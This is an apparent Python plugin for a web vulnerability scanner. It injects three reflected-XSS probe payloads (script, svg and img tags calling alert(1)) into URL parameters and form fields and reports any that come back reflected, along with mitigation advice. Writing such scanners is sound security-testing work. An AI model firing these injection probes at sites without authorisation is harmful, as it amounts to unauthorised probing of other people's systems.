"""
XSS module - provides param_test and form_test hooks.
"""
from urllib.parse import urlparse, parse_qs, urlencode
import requests, time
from utils import retry_request

XSS_PAYLOADS = [
    "\"'><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
]

def param_test(url, param, session, scanner):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    orig = qs.get(param, [""])[0]
    base = url.split('?',1)[0]
    for payload in XSS_PAYLOADS:
        qs[param] = payload
        query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k,v in qs.items())
        test_url = base + "?" + query
        if scanner._is_denied(test_url): 
            continue
        try:
            r = retry_request(session.get, test_url, timeout=15)
            # check reflection
            if payload.lower() in (r.text or "").lower():
                return {
                    "host": scanner.root,
                    "endpoint": test_url,
                    "vul_type": "Reflected XSS",
                    "param": param,
                    "payload": payload,
                    "details": "payload reflected in response",
                    "request_raw": f"GET {test_url} HTTP/1.1\n",
                    "response_raw": r.text,
                    "short_desc": "Reflected XSS detected",
                    "mitigation": "Output encode and validate input"
                }
        except Exception:
            pass
        time.sleep(scanner.sleep)
    return None

def form_test(form, session, scanner):
    # inject first few payloads into each field
    for field in list(form.get("inputs",{}).keys())[:6]:
        for payload in XSS_PAYLOADS[:4]:
            data = {k:(payload if k==field else v) for k,v in form.get("inputs",{}).items()}
            try:
                if form.get("method","GET").upper() == "POST":
                    r = retry_request(session.post, form["action"], data=data, timeout=15)
                else:
                    r = retry_request(session.get, form["action"], params=data, timeout=15)
                if payload.lower() in (r.text or "").lower():
                    return {
                        "host": scanner.root,
                        "endpoint": form["action"],
                        "vul_type": "Reflected XSS (form)",
                        "param": field,
                        "payload": payload,
                        "details": "payload reflected in response",
                        "request_raw": f"FORM {form['action']} DATA: {data}",
                        "response_raw": r.text,
                        "short_desc": "Reflected XSS via form input",
                        "mitigation": "Output encode and validate input"
                    }
            except Exception:
                pass
            time.sleep(scanner.sleep)
    return None

def register():
    return {"name":"xss","param_test":param_test,"form_test":form_test}
